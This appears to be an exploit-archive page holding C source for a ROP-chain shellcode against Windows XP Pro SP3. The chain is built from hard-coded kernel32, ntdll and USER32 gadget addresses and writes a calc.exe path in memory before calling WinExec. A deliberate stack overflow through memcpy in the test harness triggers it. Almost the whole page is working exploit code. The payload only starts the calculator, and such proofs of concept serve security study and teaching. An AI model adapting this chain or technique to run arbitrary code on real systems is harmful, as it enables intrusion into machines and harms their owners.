<html><head><title>Windows - XP PRO SP3 - Full ROP calc shellcode</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
    Shellcode: Windows XP PRO SP3 - Full ROP calc shellcode
    Author: b33f (http://www.fuzzysecurity.com/)
    Notes: This is probably not the most efficient way but
           I gave the dll's a run for their money ;))
    Greets: Donato, Jahmel
 
    OS-DLL's used:
       Base    |    Top     |   Size     |    Version (Important!)
    ___________|____________|____________|_____________________________
    0x7c800000 | 0x7c8f6000 | 0x000f6000 | 5.1.2600.5781 [kernel32.dll]
    0x7c900000 | 0x7c9b2000 | 0x000b2000 | 5.1.2600.6055 [ntdll.dll]
    0x7e410000 | 0x7e4a1000 | 0x00091000 | 5.1.2600.5512 [USER32.dll]
 
    UINT WINAPI WinExec(            =&gt; PTR to WinExec
      __in  LPCSTR lpCmdLine,       =&gt; C:\WINDOWS\system32\calc.exe+00000000
      __in  UINT uCmdShow           =&gt; 0x1
    );
*/
 
#include &lt;iostream&gt;
#include &quot;windows.h&quot;
 
char shellcode[]=
&quot;\xb1\x4f\x97\x7c&quot;  // POP ECX # RETN
&quot;\xf9\x10\x47\x7e&quot;  // Writable PTR USER32.dll
&quot;\x27\xfa\x87\x7c&quot;  // POP EDX # POP EAX # RETN
&quot;\x43\x3a\x5c\x57&quot;  // ASCII &quot;C:\W&quot;
&quot;\x49\x4e\x44\x4f&quot;  // ASCII &quot;INDO&quot;
&quot;\x04\x18\x80\x7c&quot;  // MOV DWORD PTR DS:[ECX],EDX # MOV DWORD PTR DS:[ECX+4],EAX # POP EBP # RETN 04
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\xe5\x02\x88\x7c&quot;  // POP EAX # RETN
&quot;\x57\x53\x5c\x73&quot;  // ASCII &quot;WS\s&quot;
&quot;\x38\xd6\x46\x7e&quot;  // MOV DWORD PTR DS:[ECX+8],EAX # POP ESI # POP EBP # RETN 08
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\xe5\x02\x88\x7c&quot;  // POP EAX # RETN
&quot;\x79\x73\x74\x65&quot;  // ASCII &quot;yste&quot;
&quot;\xcb\xbe\x45\x7e&quot;  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\xe5\x02\x88\x7c&quot;  // POP EAX # RETN
&quot;\x63\x61\x6c\x63&quot;  // ASCII &quot;calc&quot;
&quot;\x31\xa9\x91\x7c&quot;  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\xe5\x02\x88\x7c&quot;  // POP EAX # RETN
&quot;\x6d\x33\x32\x5c&quot;  // ASCII &quot;m32\&quot;
&quot;\xcb\xbe\x45\x7e&quot;  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\xe5\x02\x88\x7c&quot;  // POP EAX # RETN
&quot;\x2e\x65\x78\x65&quot;  // ASCII &quot;.exe&quot;
&quot;\x31\xa9\x91\x7c&quot;  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\x9e\x2e\x92\x7c&quot;  // XOR EAX,EAX # RETN
&quot;\x31\xa9\x91\x7c&quot;  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
&quot;\xee\x4c\x97\x7c&quot;  // DEC ECX # RETN
//-------------------------------------------[&quot;C:\WINDOWS\system32\calc.exe+00000000&quot; -&gt; ecx]-//
&quot;\xe5\x02\x88\x7c&quot;  // POP EAX # RETN
&quot;\x7a\xeb\xc3\x6f&quot;  // Should result in a valid PTR in kernel32.dll
&quot;\x4f\xda\x85\x7c&quot;  // PUSH ESP # ADC BYTE PTR DS:[EAX+CC4837C],AL # XOR EAX,EAX # INC EAX # POP EDI # POP EBP # RETN 08
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x32\xd9\x44\x7e&quot;  // XCHG EAX,EDI # RETN
&quot;\x62\x28\x97\x7c&quot;  // ADD EAX,20 # POP EBP # RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x62\x28\x97\x7c&quot;  // ADD EAX,20 # POP EBP # RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x62\x28\x97\x7c&quot;  // ADD EAX,20 # POP EBP # RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x62\x28\x97\x7c&quot;  // ADD EAX,20 # POP EBP # RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
//-----------------------------------------------------------[Save Stack Pointer + pivot eax]-//
&quot;\xd6\xd1\x95\x7c&quot;  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x33\x80\x97\x7c&quot;  // INC EAX # RETN
&quot;\x33\x80\x97\x7c&quot;  // INC EAX # RETN
&quot;\x33\x80\x97\x7c&quot;  // INC EAX # RETN
&quot;\x33\x80\x97\x7c&quot;  // INC EAX # RETN
&quot;\xf5\xd6\x91\x7c&quot;  // XOR ECX,ECX # RETN
&quot;\x07\x3d\x96\x7c&quot;  // INC ECX # RETN
&quot;\xd6\xd1\x95\x7c&quot;  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\xb1\x4f\x97\x7c&quot;  // POP ECX # RETN
&quot;\xed\x2a\x86\x7c&quot;  // WinExec()
&quot;\xe7\xc1\x87\x7c&quot;  // MOV DWORD PTR DS:[EAX+4],ECX # XOR EAX,EAX # POP EBP # RETN 04
&quot;\x8a\x20\x87\x7c&quot;  // Compensate POP
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Compensate RETN
&quot;\x8a\x20\x87\x7c&quot;  // Final RETN for WinExec()
&quot;\x8a\x20\x87\x7c&quot;; // Compensate WinExec()
//------------------------------------------------------[Write Arguments and execute -&gt; calc]-//
 
void buff() {
    char a;
    memcpy((&amp;a)+5, shellcode, sizeof(shellcode)); // Compiler dependent, works with Dev-C++ 4.9
}
 
int main()
{
    LoadLibrary(&quot;USER32.dll&quot;); // we need this dll
    char buf[1024];
    buff();
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
